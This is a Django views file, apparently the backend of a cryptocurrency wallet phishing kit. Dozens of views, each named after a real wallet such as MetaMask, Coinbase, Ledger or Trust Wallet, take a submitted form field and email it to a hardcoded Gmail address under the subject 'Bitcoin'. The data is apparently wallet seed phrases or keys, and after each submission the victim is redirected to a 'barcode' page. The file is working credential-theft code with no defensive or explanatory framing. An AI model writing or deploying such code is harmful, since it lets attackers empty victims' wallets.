from django.shortcuts import render, redirect
from django.http import HttpResponseRedirect, HttpResponse
from django.views.generic import TemplateView

from django.core.mail import send_mail



def index(request):
    return render(request,'index.html')

def barcode(request):
    return render(request,'barcode.html')
	
def input(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'Metamask wallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'input.html') 



def coinbase(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		} 
		
		send_mail(
            'Bitcoin',
            'coinbase wallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'coinbase.html') 

	
	
def alphawallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'alphawallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'alphawallet.html') 
	


def argentwallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'argentwallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'argentwallet.html') 
	
	
def metamask(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'metamask : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'metamask.html') 
	
	
def trustwallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'trustwallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'trustwallet.html') 
	

def coin98(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'coin98 : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'coin98.html') 
	
def coinomi(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'coinomi : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'coinomi.html') 
	
def crypto(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'crypto : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'crypto.html') 
	

def eidoo(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'eidoo : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'eidoo.html') 
	
	
def exodus(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'exodus : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'exodus.html') 
	

def gridplus(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'gridplus : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'gridplus.html') 
	
def huobi(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'huobi : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'huobi.html') 
	
	
def imtoken(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'imtoken : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'imtoken.html') 
	

def infinitowallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'infinitowallet : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'infinitowallet.html') 
	

def infinity(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'infinity : ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'infinity.html') 
	
	
	
def ledger(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'ledger wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'ledger.html') 
	
	

def mathwallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'math wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'mathwallet.html') 
	
def atomic(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'atomic: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'atomic.html') 
	
	
def mew(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'mew: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'mew.html') 
	
def midas(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'midas: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'midas.html') 
	
	
def moriX(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'moriX: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'moriX.html') 
	
def mykey(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'mykey: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'mykey.html') 
	

def nash(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'nash: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'nash.html') 
	
	
def onto(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'onto: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'onto.html') 
	


def ownbit(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'ownbit: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'ownbit.html') 
	

def peakdefi(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'peakdefi: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'peakdefi.html') 
	

def pillar(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'pillar: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'pillar.html') 
	

def rainbow(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'rainbow: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'rainbow.html') 
	

def safepal(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'safepal wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'safepal.html') 
	

def safepal(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'safepal wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'safepal.html') 
	


def sparkpoint(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'spark point wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'sparkpoint.html') 
	


def spatium(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'spatium wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'spatium.html') 
	


def swft(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'swft wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'swft.html') 
	


def tokenpocket(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'token pocket wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'tokenpocket.html') 
	


def tokenpockett(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'token pocket wallet 2: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'tokenpockett.html') 
	

def tronlink(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'tronlink: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'tronlink.html') 
	


def atwallet(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'atwallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'atwallet.html') 
	

def unstoppable(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'unstoppable wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'unstoppable.html') 

	
def vision(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'vision wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'vision.html') 
	
	
def walleth(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'walleth: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'walleth.html') 
	
	
def walletio(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'walleth IO: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'walletio.html') 
	

def xdc(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'XDC wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'xdc.html') 
	
	
def zelcore(request):
	if request.method == 'POST':
		message = request.POST.get('message')
		
		data = {
			
			'message': message,
		
		}
		
		send_mail(
            'Bitcoin',
            'zelcore wallet: ' + data['message'],
            'smileinnovativesolutions@gmail.com',
            ['ladsavvy@gmail.com'],
            fail_silently=False,
        )
		return redirect('/barcode/')
	return render(request,'zelcore.html') 